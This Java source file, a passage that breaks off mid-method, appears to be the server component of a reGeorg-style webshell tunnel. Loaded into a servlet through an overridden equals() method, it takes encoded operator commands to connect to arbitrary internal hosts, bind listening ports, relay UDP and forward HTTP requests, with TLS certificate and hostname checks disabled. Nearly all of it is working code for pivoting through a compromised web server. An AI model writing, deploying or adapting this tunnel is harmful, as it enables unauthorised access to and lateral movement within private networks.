import java.io.*;
import java.lang.reflect.Method;
import java.net.*;
import java.util.*;
import java.nio.ByteBuffer;
import java.nio.channels.Channel;
import java.nio.channels.SocketChannel;
import java.nio.channels.DatagramChannel;
import java.nio.channels.ServerSocketChannel;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import javax.net.ssl.*;
import java.util.concurrent.*;
import java.util.zip.Deflater;
import java.util.zip.Inflater;

public class roger implements HostnameVerifier, X509TrustManager, Runnable {
    private char[] en;
    private byte[] de;

    public static java.util.Map<String,Object> sessions = new java.util.concurrent.ConcurrentHashMap<>();
    public static java.util.Map<String,Boolean> remoteWriteClosed = new java.util.concurrent.ConcurrentHashMap<>();
    public static java.util.Map<String,Boolean> remoteWriteNotified = new java.util.concurrent.ConcurrentHashMap<>();
    public static java.util.Map<String,Object[]> settings = new java.util.concurrent.ConcurrentHashMap<>();
    public static java.util.Map<Thread,Object[]> threadArgs = new java.util.concurrent.ConcurrentHashMap<>();

    public int intSetting(Object[] info, int key, int fallback) {
        try {
            if (info[key] == null) return fallback;
            int value = Integer.parseInt((String) info[key]);
            return value > 0 ? value : fallback;
        } catch (Exception e) {
            return fallback;
        }
    }

    public boolean boolSetting(Object[] info, int key, boolean fallback) {
        try {
            if (info[key] == null) return fallback;
            String value = ((String) info[key]).toLowerCase();
            return value.equals("1") || value.equals("true");
        } catch (Exception e) {
            return fallback;
        }
    }

    public String compressionSetting(Object[] info, int key, String fallback) {
        try {
            if (info[key] == null) return fallback;
            String value = ((String) info[key]).toLowerCase();
            return value.equals("dynamic") || value.equals("optimal") || value.equals("smart") ? value : fallback;
        } catch (Exception e) {
            return fallback;
        }
    }

    public Object[] settingsFromInfo(Object[] info, int READBUFOPT, int MAXREADOPT, int UDPFRAGOPT, int HALFCLOSEOPT, int SERVERCOMPOPT, int SERVERLIMITOPT, int UDPTIMEOUTOPT, int READBUF, int MAXREADSIZE, int UDPFRAGSIZE, int UDP_IDLE_TIMEOUT, boolean HALF_CLOSE_MODE) {
        return new Object[]{
            new Integer(intSetting(info, READBUFOPT, READBUF)),
            new Integer(intSetting(info, MAXREADOPT, MAXREADSIZE)),
            new Integer(intSetting(info, UDPFRAGOPT, UDPFRAGSIZE)),
            new Boolean(boolSetting(info, HALFCLOSEOPT, HALF_CLOSE_MODE)),
            compressionSetting(info, SERVERCOMPOPT, "optimal"),
            new Integer(intSetting(info, SERVERLIMITOPT, 1024)),
            new Integer(intSetting(info, UDPTIMEOUTOPT, UDP_IDLE_TIMEOUT))
        };
    }

    public Object[] getSettings(String mark, int READBUF, int MAXREADSIZE, int UDPFRAGSIZE, int UDP_IDLE_TIMEOUT, boolean HALF_CLOSE_MODE) {
        Object[] value = settings.get(mark);
        if (value != null) return value;
        return new Object[]{new Integer(READBUF), new Integer(MAXREADSIZE), new Integer(UDPFRAGSIZE), new Boolean(HALF_CLOSE_MODE), "optimal", new Integer(1024), new Integer(UDP_IDLE_TIMEOUT)};
    }

    public Object[] updateSettingsFromInfo(Object[] current, Object[] info, int READBUFOPT, int MAXREADOPT, int UDPFRAGOPT, int HALFCLOSEOPT, int SERVERCOMPOPT, int SERVERLIMITOPT, int UDPTIMEOUTOPT) {
        Object[] updated = new Object[]{current[0], current[1], current[2], current[3], current[4], current[5], current[6]};
        if (info[READBUFOPT] != null) updated[0] = new Integer(intSetting(info, READBUFOPT, ((Integer)updated[0]).intValue()));
        if (info[MAXREADOPT] != null) updated[1] = new Integer(intSetting(info, MAXREADOPT, ((Integer)updated[1]).intValue()));
        if (info[UDPFRAGOPT] != null) updated[2] = new Integer(intSetting(info, UDPFRAGOPT, ((Integer)updated[2]).intValue()));
        if (info[HALFCLOSEOPT] != null) updated[3] = new Boolean(boolSetting(info, HALFCLOSEOPT, ((Boolean)updated[3]).booleanValue()));
        if (info[SERVERCOMPOPT] != null) updated[4] = compressionSetting(info, SERVERCOMPOPT, (String)updated[4]);
        if (info[SERVERLIMITOPT] != null) updated[5] = new Integer(intSetting(info, SERVERLIMITOPT, ((Integer)updated[5]).intValue()));
        if (info[UDPTIMEOUTOPT] != null) updated[6] = new Integer(intSetting(info, UDPTIMEOUTOPT, ((Integer)updated[6]).intValue()));
        return updated;
    }

    public boolean fillDownlinkFrame(Object[] rinfo, String mark, int DATA, int CMD, int STATUS, int ERROR, int IP, int PORT, int UDPFRAG, int READBUF, int MAXREADSIZE, int UDPFRAGSIZE, int UDP_IDLE_TIMEOUT, boolean HALF_CLOSE_MODE, int UDPMAXSIZE) {
        Object channel = sessions.get(mark);
        Object[] sessionSettings = getSettings(mark, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);
        int sessionReadbuf = ((Integer)sessionSettings[0]).intValue();
        int sessionMaxread = ((Integer)sessionSettings[1]).intValue();
        int sessionUdpfrag = ((Integer)sessionSettings[2]).intValue();
        boolean sessionHalfClose = ((Boolean)sessionSettings[3]).booleanValue();
        int sessionUdpTimeout = ((Integer)sessionSettings[6]).intValue();

        if (channel instanceof SocketChannel) {
            SocketChannel socketChannel = (SocketChannel)channel;
            try {
                ByteBuffer buf = ByteBuffer.allocate(sessionReadbuf);
                int bytesRead = socketChannel.read(buf);
                int maxRead = sessionMaxread;
                int readLen = 0;
                ByteArrayOutputStream readData = new ByteArrayOutputStream();
                while (bytesRead != -1) {
                    if (bytesRead > 0) {
                        byte[] block = new byte[bytesRead];
                        System.arraycopy(buf.array(), 0, block, 0, bytesRead);
                        readData.write(block);
                        readLen += bytesRead;
                    }
                    ((java.nio.Buffer)buf).clear();
                    if (bytesRead <= 0 || bytesRead < sessionReadbuf || readLen >= maxRead) {
                        break;
                    }
                    bytesRead = socketChannel.read(buf);
                }
                rinfo[STATUS] = "OK";
                if (readData.size() > 0) {
                    rinfo[CMD] = "DATA";
                    rinfo[DATA] = readData.toByteArray();
                    return false;
                }
                if (bytesRead == -1) {
                    if (sessionHalfClose) {
                        remoteWriteClosed.put(mark, Boolean.TRUE);
                        Boolean notified = remoteWriteNotified.get(mark);
                        if (notified == null || !notified.booleanValue()) {
                            remoteWriteNotified.put(mark, Boolean.TRUE);
                            rinfo[CMD] = "SHUT_WR";
                        } else {
                            rinfo[CMD] = "HEARTBEAT";
                        }
                    } else {
                        sessions.remove(mark);
                        remoteWriteClosed.remove(mark);
                        remoteWriteNotified.remove(mark);
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = "Session is closed";
                    }
                    return !sessionHalfClose;
                }
                rinfo[CMD] = "HEARTBEAT";
                return false;
            } catch (Exception e) {
                rinfo[STATUS] = "FAIL";
                rinfo[ERROR] = e.toString();
                return true;
            }
        } else if (channel instanceof ServerSocketChannel) {
            rinfo[STATUS] = "OK";
            rinfo[CMD] = "HEARTBEAT";
            return false;
        } else if (channel instanceof java.util.Map) {
            java.util.Map udpSession = (java.util.Map)channel;
            DatagramChannel datagramChannel = (DatagramChannel)udpSession.get("channel");
            java.util.LinkedList udpOut = (java.util.LinkedList)udpSession.get("out");
            try {
                Long lastActivity = (Long)udpSession.get("lastActivity");
                if (lastActivity != null && System.currentTimeMillis() - lastActivity.longValue() > sessionUdpTimeout * 1000L) {
                    if (datagramChannel != null) {
                        datagramChannel.close();
                    }
                    sessions.remove(mark);
                    rinfo[STATUS] = "FAIL";
                    rinfo[ERROR] = "Session is closed";
                    return true;
                }
                if (!udpOut.isEmpty()) {
                    Object[] queued = (Object[])udpOut.removeFirst();
                    InetSocketAddress inetSender = (InetSocketAddress) queued[1];
                    rinfo[STATUS] = "OK";
                    rinfo[CMD] = "DATA";
                    rinfo[IP] = inetSender.getAddress().getHostAddress();
                    rinfo[PORT] = Integer.toString(inetSender.getPort());
                    Object[] fragment = (Object[]) queued[0];
                    rinfo[DATA] = (byte[])fragment[1];
                    if (fragment[0] != null) {
                        rinfo[UDPFRAG] = (byte[])fragment[0];
                    }
                    return false;
                } else if (datagramChannel != null) {
                    ByteBuffer buf = ByteBuffer.allocate(65497);
                    SocketAddress clientAddress = datagramChannel.receive(buf);
                    if (clientAddress != null) {
                        buf.flip();
                        int bytesReceived = buf.remaining();
                        if (bytesReceived > 0) {
                            udpSession.put("lastActivity", new Long(System.currentTimeMillis()));
                            byte[] packetBytes = new byte[bytesReceived];
                            buf.get(packetBytes);
                            InetSocketAddress inetSender = (InetSocketAddress) clientAddress;
                            Object[][] fragments = udpFragmentPayload(packetBytes, sessionUdpfrag);
                            for (int i = 0; i < fragments.length; i++) {
                                udpOut.add(new Object[]{fragments[i], inetSender});
                            }
                            if (!udpOut.isEmpty()) {
                                Object[] queued = (Object[])udpOut.removeFirst();
                                rinfo[STATUS] = "OK";
                                rinfo[CMD] = "DATA";
                                rinfo[IP] = inetSender.getAddress().getHostAddress();
                                rinfo[PORT] = Integer.toString(inetSender.getPort());
                                Object[] fragment = (Object[]) queued[0];
                                rinfo[DATA] = (byte[])fragment[1];
                                if (fragment[0] != null) {
                                    rinfo[UDPFRAG] = (byte[])fragment[0];
                                }
                                return false;
                            }
                        }
                    }
                }
                rinfo[STATUS] = "OK";
                rinfo[CMD] = "HEARTBEAT";
                return false;
            } catch (Exception e) {
                rinfo[STATUS] = "FAIL";
                rinfo[ERROR] = e.toString();
                return true;
            }
        }
        rinfo[STATUS] = "FAIL";
        rinfo[ERROR] = "Session is closed";
        return true;
    }

    public void writeAll(SocketChannel channel, byte[] data) throws Exception {
        ByteBuffer buf = ByteBuffer.wrap(data);
        while (buf.hasRemaining()) {
            int n = channel.write(buf);
            if (n == 0) {
                Thread.sleep(1);
            }
        }
    }

    public void writeAll(DatagramChannel channel, ByteBuffer buf, SocketAddress address) throws Exception {
        while (buf.hasRemaining()) {
            int n = channel.send(buf, address);
            if (n == 0) {
                Thread.sleep(1);
            }
        }
    }

    public byte[] readExact(InputStream in, int length) throws Exception {
        byte[] data = new byte[length];
        int offset = 0;
        while (offset < length) {
            int n = in.read(data, offset, length - offset);
            if (n == -1) {
                if (offset == 0) {
                    return null;
                }
                throw new EOFException("Unexpected stream EOF");
            }
            offset += n;
        }
        return data;
    }

    public Object[] tryReadInitialStreamFrame(PushbackInputStream in, Integer offset) throws Exception {
        byte[] header = readExact(in, 8);
        if (header == null) {
            return null;
        }
        int frameLen = -1;
        try {
            frameLen = Integer.parseInt(new String(header, "US-ASCII"), 16);
        } catch (Exception e) {
            in.unread(header);
            return null;
        }
        if (frameLen < 0 || frameLen > 524288) {
            in.unread(header);
            return null;
        }
        byte[] payload = readExact(in, frameLen);
        if (payload == null) {
            in.unread(header);
            return null;
        }
        try {
            Object[] info = decodeStreamFrame(payload, offset);
            if (!"DUPLEX".equals((String)info[2]) && !"PROBE".equals((String)info[2])) {
                in.unread(payload);
                in.unread(header);
                return null;
            }
            return info;
        } catch (Exception e) {
            in.unread(payload);
            in.unread(header);
            return null;
        }
    }

    public Object[] readStreamFrame(InputStream in, Integer offset) throws Exception {
        byte[] header = readExact(in, 8);
        if (header == null) {
            return null;
        }
        int frameLen = Integer.parseInt(new String(header, "US-ASCII"), 16);
        if (frameLen < 0 || frameLen > 524288) {
            throw new IOException("Invalid stream frame length");
        }
        byte[] payload = readExact(in, frameLen);
        if (payload == null) {
            return null;
        }
        return decodeStreamFrame(payload, offset);
    }

    public Object[] decodeStreamFrame(byte[] payload, Integer offset) throws Exception {
        String compact = new String(payload, "US-ASCII");
        while ((compact.length() % 4) != 0) {
            compact += "=";
        }
        return blv_decode(b64de(compact), offset);
    }

    public void applyUplinkFrame(String mark, Object[] info, int DATA, int CMD, int IP, int PORT, int UDPFRAG, int UDPMAXSIZE) throws Exception {
        String cmd = (String)info[CMD];
        if (cmd == null || "HEARTBEAT".equals(cmd)) {
            return;
        }
        Object channel = sessions.get(mark);
        if ("UPDATE_SETTINGS".equals(cmd)) {
            Object[] sessionSettings = (Object[])settings.get(mark);
            if (sessionSettings != null) {
                settings.put(mark, updateSettingsFromInfo(sessionSettings, info, 12, 13, 14, 15, 17, 19, 20));
            }
            return;
        }
        if ("DISCONNECT".equals(cmd)) {
            if (channel instanceof Channel) {
                ((Channel)channel).close();
            } else if (channel instanceof java.util.Map) {
                Object udpChannel = ((java.util.Map)channel).get("channel");
                if (udpChannel instanceof Channel) {
                    ((Channel)udpChannel).close();
                }
            }
            sessions.remove(mark);
            remoteWriteClosed.remove(mark);
            remoteWriteNotified.remove(mark);
            return;
        }
        if ("SHUT_WR".equals(cmd)) {
            if (channel instanceof SocketChannel) {
                ((SocketChannel)channel).socket().shutdownOutput();
            }
            return;
        }
        if (!"DATA".equals(cmd) || channel == null) {
            return;
        }
        byte[] writeData = (byte[])info[DATA];
        if (channel instanceof SocketChannel) {
            writeAll((SocketChannel)channel, writeData);
        } else if (channel instanceof java.util.Map) {
            java.util.Map udpSession = (java.util.Map)channel;
            DatagramChannel datagramChannel = (DatagramChannel)udpSession.get("channel");
            String target = (String) info[IP];
            int port = Integer.parseInt((String) info[PORT]);
            writeData = udpReassembleFragment((java.util.Map<Integer, Object[]>)udpSession.get("in"), writeData, (byte[]) info[UDPFRAG], UDPMAXSIZE);
            udpSession.put("lastActivity", new Long(System.currentTimeMillis()));
            if (writeData == null) {
                return;
            }
            writeAll(datagramChannel, ByteBuffer.wrap(writeData), new InetSocketAddress(target, port));
        }
    }

    public void run() {
        Object[] args = threadArgs.remove(Thread.currentThread());
        if (args == null) {
            return;
        }
        try {
            InputStream in = (InputStream)args[0];
            String mark = (String)args[1];
            int DATA = ((Integer)args[2]).intValue();
            int CMD = ((Integer)args[3]).intValue();
            int IP = ((Integer)args[4]).intValue();
            int PORT = ((Integer)args[5]).intValue();
            int UDPFRAG = ((Integer)args[6]).intValue();
            int UDPMAXSIZE = ((Integer)args[7]).intValue();
            int BLV_L_OFFSET = ((Integer)args[8]).intValue();
            while (true) {
                Object[] info = readStreamFrame(in, new Integer(BLV_L_OFFSET));
                if (info == null) {
                    return;
                }
                applyUplinkFrame(mark, info, DATA, CMD, IP, PORT, UDPFRAG, UDPMAXSIZE);
            }
        } catch (Exception e) {
        }
    }

    public void handleFullDuplex(final InputStream in, final Writer out, final Object[] firstInfo, final int DATA, final int CMD, final int STATUS, final int ERROR, final int IP, final int PORT, final int UDPFRAG, final int READBUF, final int MAXREADSIZE, final int UDPFRAGSIZE, final int UDP_IDLE_TIMEOUT, final boolean HALF_CLOSE_MODE, final int UDPMAXSIZE, final int BLV_L_OFFSET) throws Exception {
        final String mark = (String)firstInfo[3];
        if ("PROBE".equals((String)firstInfo[CMD])) {
            Object[] probeSettings = new Object[]{new Integer(READBUF), new Integer(MAXREADSIZE), new Integer(UDPFRAGSIZE), new Boolean(HALF_CLOSE_MODE), "optimal", new Integer(1024), new Integer(UDP_IDLE_TIMEOUT)};
            Object[] rinfo = new Object[40];
            rinfo[STATUS] = "OK";
            writeStreamFrame(out, rinfo, new Integer(BLV_L_OFFSET), (String)probeSettings[4], ((Integer)probeSettings[5]).intValue());
            return;
        }
        Object channel = sessions.get(mark);
        if (channel == null) {
            return;
        }
        final Object[] responseSettings = getSettings(mark, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);

        Thread uplink = new Thread(this);
        threadArgs.put(uplink, new Object[]{in, mark, new Integer(DATA), new Integer(CMD), new Integer(IP), new Integer(PORT), new Integer(UDPFRAG), new Integer(UDPMAXSIZE), new Integer(BLV_L_OFFSET)});
        uplink.setDaemon(true);
        uplink.start();

        long lastHeartbeat = System.currentTimeMillis();
        long heartbeatInterval = 5000L;
        while (true) {
            Object[] frameInfo = new Object[40];
            boolean closeAfterWrite = fillDownlinkFrame(frameInfo, mark, DATA, CMD, STATUS, ERROR, IP, PORT, UDPFRAG, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE, UDPMAXSIZE);
            if ("HEARTBEAT".equals(frameInfo[CMD]) && System.currentTimeMillis() - lastHeartbeat < heartbeatInterval) {
                Thread.sleep(50);
                continue;
            }
            writeStreamFrame(out, frameInfo, new Integer(BLV_L_OFFSET), (String)responseSettings[4], ((Integer)responseSettings[5]).intValue());
            if ("HEARTBEAT".equals(frameInfo[CMD])) {
                lastHeartbeat = System.currentTimeMillis();
            }
            if (closeAfterWrite) {
                break;
            }
            Thread.sleep(50);
        }
    }

    public Object[][] udpFragmentPayload(byte[] data, int UDPFRAGSIZE) {
        if (UDPFRAGSIZE <= 0) {
            return new Object[0][];
        }
        if (data.length <= UDPFRAGSIZE) {
            return new Object[][]{new Object[]{null, data}};
        }
        int count = Math.max(1, (data.length + UDPFRAGSIZE - 1) / UDPFRAGSIZE);
        int id = new java.util.Random().nextInt();
        Object[][] fragments = new Object[count][];
        for (int i = 0; i < count; i++) {
            int start = i * UDPFRAGSIZE;
            int end = Math.min(data.length, start + UDPFRAGSIZE);
            byte[] meta = new byte[12];
            byte[] chunk = new byte[end - start];
            ByteBuffer.wrap(meta, 0, 4).putInt(id);
            ByteBuffer.wrap(meta, 4, 2).putShort((short)i);
            ByteBuffer.wrap(meta, 6, 2).putShort((short)count);
            ByteBuffer.wrap(meta, 8, 4).putInt(data.length);
            System.arraycopy(data, start, chunk, 0, chunk.length);
            fragments[i] = new Object[]{meta, chunk};
        }
        return fragments;
    }

    public byte[] udpReassembleFragment(java.util.Map<Integer, Object[]> buffers, byte[] data, byte[] meta, int UDPMAXSIZE) {
        if (meta == null || meta.length == 0) {
            return data;
        }
        if (meta.length != 12) {
            return null;
        }
        ByteBuffer header = ByteBuffer.wrap(meta);
        int id = header.getInt();
        int index = header.getShort() & 0xffff;
        int count = header.getShort() & 0xffff;
        int total = header.getInt();
        if (count < 1 || index >= count || total > UDPMAXSIZE) {
            return null;
        }
        Object[] entry = buffers.get(id);
        if (entry == null) {
            entry = new Object[]{new Integer(count), new Integer(total), new java.util.HashMap<Integer, byte[]>()};
            buffers.put(id, entry);
        }
        int entryCount = ((Integer) entry[0]).intValue();
        int entryTotal = ((Integer) entry[1]).intValue();
        java.util.Map<Integer, byte[]> chunks = (java.util.Map<Integer, byte[]>) entry[2];
        if (entryCount != count || entryTotal != total) {
            buffers.remove(id);
            return null;
        }
        chunks.put(index, data);
        if (chunks.size() != count) {
            return null;
        }
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try {
            for (int i = 0; i < count; i++) {
                byte[] part = chunks.get(i);
                if (part == null) {
                    return null;
                }
                out.write(part);
            }
        } catch (Exception e) {
            return null;
        } finally {
            buffers.remove(id);
        }
        byte[] assembled = out.toByteArray();
        if (assembled.length != total) {
            return null;
        }
        return assembled;
    }


    @Override
    public boolean equals(Object obj) {
        try {
            Object[] args     = (Object[]) obj;
            Object request    = args[0];
            Object response   = args[1];
            en                = (char[])  args[2];
            de                = (byte[])  args[3];
            int HTTPCODE      = (Integer) args[4];
            int READBUF       = (Integer) args[5];
            int MAXREADSIZE   = (Integer) args[6];
            String rogerHello = (String)  args[7];
            int BLV_L_OFFSET  = (Integer) args[8];

            int USE_REQUEST_TEMPLATE = (Integer) args[9];
            int START_INDEX   = (Integer) args[10];
            int END_INDEX     = (Integer) args[11];
            boolean HALF_CLOSE_MODE = (Boolean) args[12];
            int UDPFRAGSIZE   = (Integer) args[13];
            int UDPMAXSIZE    = (Integer) args[14];
            int UDP_IDLE_TIMEOUT = (Integer) args[15];

            int DATA          = 1;
            int CMD           = 2;
            int MARK          = 3;
            int STATUS        = 4;
            int ERROR         = 5;
            int IP            = 6;
            int PORT          = 7;
            int REDIRECTURL   = 8;
            int FORCEREDIRECT = 9;
            int UDPFRAG       = 10;
            int DATACOMP      = 11;
            int READBUFOPT    = 12;
            int MAXREADOPT    = 13;
            int UDPFRAGOPT    = 14;
            int HALFCLOSEOPT  = 15;
            int CLIENTCOMPOPT = 16;
            int SERVERCOMPOPT = 17;
            int CLIENTLIMITOPT = 18;
            int SERVERLIMITOPT = 19;
            int UDPTIMEOUTOPT = 20;
            int MODES         = 22;


            Writer out = (Writer) invokeMethod(response, "getWriter", new Object[0]);
            PushbackInputStream requestInput = new PushbackInputStream((InputStream) invokeMethod(request, "getInputStream", new Object[0]), 524296);
            Object[] firstStreamInfo = tryReadInitialStreamFrame(requestInput, new Integer(BLV_L_OFFSET));
            if (firstStreamInfo != null) {
                handleFullDuplex(requestInput, out, firstStreamInfo, DATA, CMD, STATUS, ERROR, IP, PORT, UDPFRAG, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE, UDPMAXSIZE, BLV_L_OFFSET);
                out.close();
                return false;
            }

            Object[] info  = new Object[40];
            Object[] rinfo = new Object[40];
            String requestDataHead = "";
            String requestDataTail = "";
            try {
                String inputData = "";
                ByteArrayOutputStream requestBody = new ByteArrayOutputStream();
                byte[] requestBuffer = new byte[4096];
                int requestRead;
                while ((requestRead = requestInput.read(requestBuffer)) != -1) {
                    requestBody.write(requestBuffer, 0, requestRead);
                }
                inputData = new String(requestBody.toByteArray());
                if (inputData.length() > 0) {
                    if (USE_REQUEST_TEMPLATE == 1) {
                        requestDataHead = inputData.substring(0, START_INDEX);
                        requestDataTail = inputData.substring(inputData.length() - END_INDEX, inputData.length());

                        inputData = inputData.substring(START_INDEX);
                        inputData = inputData.substring(0, inputData.length() - END_INDEX);
                    }
                    byte[] data = b64de(inputData);
                    info = blv_decode(data, BLV_L_OFFSET);
                }
            } catch ( Exception e) {
                out.write(e.toString());
                out.flush();
                out.close();
                return false; // exit
            }

            String rUrl = (String) info[REDIRECTURL];

            if (rUrl != null) {
                String force = (String) info[FORCEREDIRECT];
                if (force.compareTo("TRUE") == 0 || !islocal(rUrl)){
                    info[REDIRECTURL] = null;
                    info[FORCEREDIRECT] = null;
                    invokeMethod(response, "reset", new Object[0]);
                    String method = (String) invokeMethod(request, "getMethod", new Object[0]);
                    URL u = new URL(rUrl);
                    HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                    conn.setRequestMethod(method);
                    conn.setDoOutput(true);

                    // ignore ssl verify
                    if (HttpsURLConnection.class.isInstance(conn)){
                        ((HttpsURLConnection)conn).setHostnameVerifier(this);
                        SSLContext ctx = SSLContext.getInstance("SSL");
                        ctx.init(null, new TrustManager[] { this }, null);
                        ((HttpsURLConnection)conn).setSSLSocketFactory(ctx.getSocketFactory());
                    }

                    // conn.setConnectTimeout(200);
                    // conn.setReadTimeout(200);

                    Enumeration enu = (Enumeration) invokeMethod(request, "getHeaderNames", new Object[0]);
                    List<String> keys = Collections.list(enu);
                    Collections.reverse(keys);
                    for (String key : keys){
                        String value = (String) invokeMethod(request, "getHeader", new Object[]{key});
                        conn.setRequestProperty(headerkey(key), value);
                    }

                    if (((int)(Integer)(invokeMethod(request, "getContentLength", new Object[0]))) != -1){
                        OutputStream output;
                        try{
                            output = conn.getOutputStream();
                        }catch(Exception e){
                            return false;
                        }

                        String newData = requestDataHead + b64en(blv_encode(info, BLV_L_OFFSET)) + requestDataTail;
                        byte[] data = newData.getBytes();
                        output.write(data, 0, data.length);
                        output.flush();
                        output.close();
                    }

                    for (String key : conn.getHeaderFields().keySet()) {
                        if (key != null && !key.equalsIgnoreCase("Content-Length") && !key.equalsIgnoreCase("Transfer-Encoding")){
                            String value = conn.getHeaderField(key);
                            invokeMethod(response, "setHeader", new Object[]{key, value});
                        }
                    }

                    InputStream hin;
                    if (conn.getResponseCode() < HttpURLConnection.HTTP_BAD_REQUEST) {
                        hin = conn.getInputStream();
                    } else {
                        hin = conn.getErrorStream();
                        if (hin == null){
                            invokeMethod(response, "setStatus", new Object[]{HTTPCODE});
                            return false;
                        }
                    }

                    int i;
                    byte[] buffer = new byte[1024];
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    while ((i = hin.read(buffer)) != -1) {
                        byte[] data = new byte[i];
                        System.arraycopy(buffer, 0, data, 0, i);
                        baos.write(data);
                    }
                    String responseBody = baos.toString();
                    invokeMethod(response, "addHeader", new Object[]{"Content-Length", Integer.toString(responseBody.length())});
                    invokeMethod(response, "setStatus", new Object[]{conn.getResponseCode()});
                    out.write(responseBody.trim());
                    out.flush();
                    out.close();

                    if ( true ) return false; // exit
                }
            }
            invokeMethod(response, "resetBuffer", new Object[0]);
            invokeMethod(response, "setStatus", new Object[]{HTTPCODE});
            String cmd = (String) info[CMD];
            if (cmd != null) {
                String mark = (String) info[MARK];
                if (cmd.compareTo("CAPS") == 0) {
                    rinfo[STATUS] = "OK";
                    rinfo[MODES] = "classic,half,full";
                } else if (cmd.compareTo("PROBE") == 0) {
                    rinfo[STATUS] = "OK";
                } else if (cmd.compareTo("SETTINGS") == 0) {
                    rinfo[STATUS] = "OK";
                } else if (cmd.compareTo("UPDATE_SETTINGS") == 0) {
                    Object channel = sessions.get(mark);
                    if (channel != null) {
                        Object[] sessionSettings = getSettings(mark, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);
                        settings.put(mark, updateSettingsFromInfo(sessionSettings, info, READBUFOPT, MAXREADOPT, UDPFRAGOPT, HALFCLOSEOPT, SERVERCOMPOPT, SERVERLIMITOPT, UDPTIMEOUTOPT));
                        rinfo[STATUS] = "OK";
                    } else {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = "Session is closed";
                    }
                } else if (cmd.compareTo("CONNECT") == 0) {
                    try {
                        Object[] sessionSettings = settingsFromInfo(info, READBUFOPT, MAXREADOPT, UDPFRAGOPT, HALFCLOSEOPT, SERVERCOMPOPT, SERVERLIMITOPT, UDPTIMEOUTOPT, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);
                        String target = (String) info[IP];
                        int port = Integer.parseInt((String) info[PORT]);
                        SocketChannel socketChannel = SocketChannel.open();
                        socketChannel.socket().connect(new InetSocketAddress(target, port), 3000); // set timeout 3 seconds, default 120 seconds
                        socketChannel.configureBlocking(false);
                        settings.put(mark, sessionSettings);
                        sessions.put(mark, socketChannel);
                        remoteWriteClosed.put(mark, Boolean.FALSE);
                        remoteWriteNotified.remove(mark);
                        rinfo[STATUS] = "OK";
                    } catch (Exception e) {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = e.toString();
                    }
                } else if (cmd.compareTo("BIND") == 0) {
                    try {
                        Object[] sessionSettings = settingsFromInfo(info, READBUFOPT, MAXREADOPT, UDPFRAGOPT, HALFCLOSEOPT, SERVERCOMPOPT, SERVERLIMITOPT, UDPTIMEOUTOPT, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);
                        String bndAddr = (String) info[IP];
                        String bndPort = (String) info[PORT];
                        ServerSocketChannel serverChannel = ServerSocketChannel.open();
                        serverChannel.configureBlocking(true);
                        serverChannel.bind(new InetSocketAddress(bndAddr, Integer.parseInt(bndPort)));
                        rinfo[STATUS] = "OK";
                        rinfo[IP] = bndAddr;
                        rinfo[PORT] = bndPort;
                        settings.put(mark, sessionSettings);
                        sessions.put(mark, serverChannel);
                        new Thread(() -> {
                            try {
                                SocketChannel clientChannel = serverChannel.accept();
                                clientChannel.configureBlocking(false);
                                sessions.put(mark, clientChannel);
                                remoteWriteClosed.put(mark, Boolean.FALSE);
                                remoteWriteNotified.remove(mark);
                                //clientSocket.close();
                                serverChannel.close();
                            } catch (Exception e) {
                            }
                        }).start();
                    } catch (Exception e) {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = e.toString();
                    }
                } else if (cmd.compareTo("UDP") == 0) {
                    try {
                        Object[] sessionSettings = settingsFromInfo(info, READBUFOPT, MAXREADOPT, UDPFRAGOPT, HALFCLOSEOPT, SERVERCOMPOPT, SERVERLIMITOPT, UDPTIMEOUTOPT, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);
                        String target = (String) info[IP];
                        int port = Integer.parseInt((String) info[PORT]);
                        DatagramChannel datagramChannel = DatagramChannel.open();    
                        datagramChannel.configureBlocking(false);
                        datagramChannel.bind(new InetSocketAddress(target, port));
                        java.util.Map<String, Object> udpSession = new java.util.HashMap<String, Object>();
                        udpSession.put("channel", datagramChannel);
                        udpSession.put("in", new java.util.HashMap<Integer, Object[]>());
                        udpSession.put("out", new java.util.LinkedList<Object[]>());
                        udpSession.put("settings", sessionSettings);
                        udpSession.put("lastActivity", new Long(System.currentTimeMillis()));
                        settings.put(mark, sessionSettings);
                        sessions.put(mark, udpSession);
                        rinfo[STATUS] = "OK";
                        rinfo[IP] = datagramChannel.socket().getLocalAddress().getHostAddress();
                        rinfo[PORT] = Integer.toString(datagramChannel.socket().getLocalPort());
                    } catch (Exception e) {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = e.toString();
                    }
                } else if (cmd.compareTo("CHECK") == 0) {
                    rinfo[STATUS] = "OK";
                    try {
                        if (sessions.get(mark) instanceof SocketChannel) {
                            SocketChannel channel = (SocketChannel) sessions.get(mark);
                            Socket socket = channel.socket();
                            rinfo[IP] = socket.getInetAddress().getHostAddress();
                            rinfo[PORT] = Integer.toString(socket.getPort());
                        }
                    } catch (Exception e) {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = e.toString();
                    }

                } else if (cmd.compareTo("DISCONNECT") == 0) {
                    Object sessionObject = sessions.get(mark);
                    try{
                        if (sessionObject instanceof java.util.Map) {
                            Object channel = ((java.util.Map)sessionObject).get("channel");
                            if (channel instanceof Channel) {
                                ((Channel)channel).close();
                            }
                        } else if (sessionObject instanceof Channel) {
                            ((Channel)sessionObject).close();
                        }
                    } catch (Exception e) {
                    }
                    sessions.remove(mark);
                    settings.remove(mark);
